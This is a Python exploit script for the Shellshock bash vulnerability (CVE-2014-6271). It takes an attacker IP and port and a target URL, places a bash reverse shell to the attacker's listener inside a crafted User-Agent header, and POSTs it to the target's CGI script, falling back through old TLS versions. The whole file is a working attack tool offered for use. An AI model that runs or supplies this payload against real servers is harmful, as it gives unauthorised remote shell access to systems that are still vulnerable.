#!/usr/bin/python3
#
#########################################################################################
# Exploit Title : Bash Remote Code Execution through mod_cgi scripts on HTTP server.    #
# CVE: CVE-2014-6271 aka ShellShock                                                     #
# Author : b4keSn4ke                                                                    #
# Version: Bash < 4.3                                                                   #
# Tested on : Bash 3.2.25                                                               #
#########################################################################################
#
# This exploit will only work on web servers having a version of Bash < 4.3 
# through POST request made to .cgi files.

from urllib import request
import argparse
import ssl

BANNER = """
#####################################
#                                   #
#       Shellshock.py Exploit       #
#           by b4keSn4ke            #
#                                   #
#   https://github.com/b4keSn4ke/   #
#                                   #
#####################################
\n
"""

TLS_VERSIONS = {
    "TLS Version 1.2": ssl.SSLContext(ssl.PROTOCOL_TLSv1_2),
    "TLS Version 1.1": ssl.SSLContext(ssl.PROTOCOL_TLSv1_1),
    "TLS Version 1.0": ssl.SSLContext(ssl.PROTOCOL_TLSv1),
}

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Shellshock exploit by b4keSn4ke")
    parser.add_argument("LHOST", help="IP Address on which the reverse shell should connect back to")
    parser.add_argument("LPORT", help="Port on which the reverse shell should connect back to")
    parser.add_argument("TARGET_URL", help="URL to carry the exploit on")
    args = parser.parse_args()

    protocol = setProtocol(args.TARGET_URL)
    req, data = setPayload(args)
    sendPayload(req, data, args.TARGET_URL, protocol)

def setProtocol(url):
    if url[0:5] == 'https':
        return 'https'
    else:
        return 'http'

def setPayload(args):
    print("[+] Setting Payload ...")

    payload = '() { :; }; '
    reverse_shell = 'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(args.LHOST,args.LPORT)
    data = "pwned"
    req = request.Request(args.TARGET_URL, method="POST")
    req.add_header("User-Agent", payload + reverse_shell)
    req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.add_header("Accept-Language", "en-US,en;q=0.5")
    req.add_header("Accept-Encoding", "gzip, deflate")
    req.add_header("Content-Length", len(data))
    
    return (req,data)

def sendPayload(req, data, url, protocol):
    print("[+] Sending Payload to {0} ...".format(url))
    if protocol == 'http':
        try:
            request.urlopen(req, data=data.encode())
        except:
           print("\n[-] Cannot POST payload to {0} .".format(url))
           exit()
    elif protocol == 'https':
        for tls_key, tls_value in TLS_VERSIONS.items():
            try:
                print("[+] Trying to send payload over SSL with {0} ...".format(tls_key))
                request.urlopen(req, data=data.encode(), context=tls_value)
                break
            except:
                print("[-] An SSL error occured with {0}".format(tls_key))
    print("\n[+] Payload Sent successfully !")
    exit()

if __name__ == '__main__':
    main()